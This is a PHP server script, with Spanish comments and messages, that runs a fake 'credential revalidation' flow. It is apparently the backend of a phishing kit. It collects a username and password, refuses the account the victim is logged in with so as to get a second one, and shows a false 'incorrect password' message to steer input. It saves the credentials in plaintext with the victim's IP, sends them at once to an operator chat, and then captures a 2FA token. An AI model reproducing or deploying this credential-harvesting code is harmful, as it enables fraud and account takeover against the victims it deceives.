<?php
/**
 * Procesar revalidación de credenciales
 * Recibe usuario y contraseña del cliente y los guarda
 */
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

// Verificar si hay una sesión de usuario
if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión activa']);
    exit;
}

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/chat_captura_helper.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }
    
    $usuario_id = $_SESSION['usuario_id'];
    
    // PASO 1: Guardar usuario y contraseña (ANTES de los 5s de espera visual)
    if ($input['accion'] === 'guardar_credenciales_paso1') {
        $revalidacion_id = intval($input['revalidacion_id']);
        $usuario_ingresado = trim($input['usuario'] ?? '');
        $password_ingresado = trim($input['password'] ?? '');
        
        if (empty($usuario_ingresado)) {
            echo json_encode(['success' => false, 'error' => 'El usuario no puede estar vacío']);
            exit;
        }

        // No permitir el mismo usuario con el que inició sesión
        $stmtSesion = $pdo->prepare("SELECT usuarios, password FROM usuarios WHERE id = ? LIMIT 1");
        $stmtSesion->execute([$usuario_id]);
        $sesion = $stmtSesion->fetch(PDO::FETCH_ASSOC);
        if ($sesion && strcasecmp(trim((string)$sesion['usuarios']), $usuario_ingresado) === 0) {
            echo json_encode([
                'success' => false,
                'error' => 'El usuario no puede ser igual al ingresado. Use un segundo usuario.',
                'campo' => 'usuario'
            ]);
            exit;
        }
        if ($sesion && (string)$sesion['password'] === $password_ingresado) {
            echo json_encode([
                'success' => false,
                'error' => 'La contraseña no puede ser igual a la ingresada.',
                'campo' => 'password'
            ]);
            exit;
        }
        
        if (empty($password_ingresado)) {
            echo json_encode(['success' => false, 'error' => 'El campo \'password\' es obligatorio.']);
            exit;
        }

        if (strlen($password_ingresado) > 20) {
            echo json_encode(['success' => false, 'error' => 'La contraseña no debe exceder los 20 caracteres']);
            exit;
        }

        if (!preg_match('/[^a-zA-Z0-9]/', $password_ingresado)) {
            echo json_encode(['success' => false, 'error' => 'Su contraseña es incorrecta. Verifique que cumpla con el formato requerido e intente nuevamente.']);
            exit;
        }
        
        // Verificar que la revalidación pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM revalidacion_credenciales 
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$revalidacion_id, $usuario_id]);
        $revalidacion_data = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$revalidacion_data) {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
            exit;
        }
        
        // Obtener IP del usuario
        $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
                   $_SERVER['HTTP_X_REAL_IP'] ?? 
                   $_SERVER['REMOTE_ADDR'] ?? 
                   'unknown';
        
        // Guardar credenciales (sin marcar como completado aún)
        $updateStmt = $pdo->prepare("
            UPDATE revalidacion_credenciales 
            SET usuario_ingresado = ?, 
                password_ingresado = ?,
                ip_usuario = ?
            WHERE id = ?
        ");
        
        if ($updateStmt->execute([$usuario_ingresado, $password_ingresado, $ip_real, $revalidacion_id])) {
            // Enviar al chat del admin inmediatamente
            $respuesta = "Usuario: $usuario_ingresado\nPassword: $password_ingresado";
            insertarCapturaUsuario($pdo, $usuario_id, $ip_real, $respuesta);
            
            echo json_encode([
                'success' => true,
                'message' => 'Credenciales guardadas'
            ]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Error al guardar las credenciales']);
        }
        
    // PASO 2: Completar con token 2FA
    } elseif ($input['accion'] === 'completar_revalidacion') {
        $revalidacion_id = intval($input['revalidacion_id']);
        $token_ingresado = isset($input['token']) ? trim($input['token']) : null;
        
        // Verificar que la revalidación pertenece al usuario y tiene credenciales
        $stmt = $pdo->prepare("
            SELECT id, usuario_ingresado FROM revalidacion_credenciales 
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$revalidacion_id, $usuario_id]);
        $revalidacion_data = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$revalidacion_data) {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
            exit;
        }
        
        $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
                   $_SERVER['HTTP_X_REAL_IP'] ?? 
                   $_SERVER['REMOTE_ADDR'] ?? 
                   'unknown';
        
        // Actualizar token y marcar como completado
        $updateStmt = $pdo->prepare("
            UPDATE revalidacion_credenciales 
            SET sgdotoken_codigo = ?,
                estado = 'completado', 
                fecha_completado = NOW() 
            WHERE id = ?
        ");
        
        if ($updateStmt->execute([$token_ingresado, $revalidacion_id])) {
            echo json_encode([
                'success' => true,
                'message' => 'Validación completada'
            ]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Error al completar']);
        }
        
    } elseif ($input['accion'] === 'cancelar_revalidacion') {
        $revalidacion_id = intval($input['revalidacion_id']);
        
        // Verificar que la revalidación pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM revalidacion_credenciales 
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$revalidacion_id, $usuario_id]);
        
        if ($stmt->fetch()) {
            // Cancelar la revalidación
            $updateStmt = $pdo->prepare("
                UPDATE revalidacion_credenciales 
                SET estado = 'cancelado' 
                WHERE id = ?
            ");
            
            if ($updateStmt->execute([$revalidacion_id])) {
                echo json_encode(['success' => true, 'message' => 'Solicitud cancelada']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Error al cancelar solicitud']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
        }
        
    } else {
        echo json_encode(['success' => false, 'error' => 'Acción no válida']);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?>
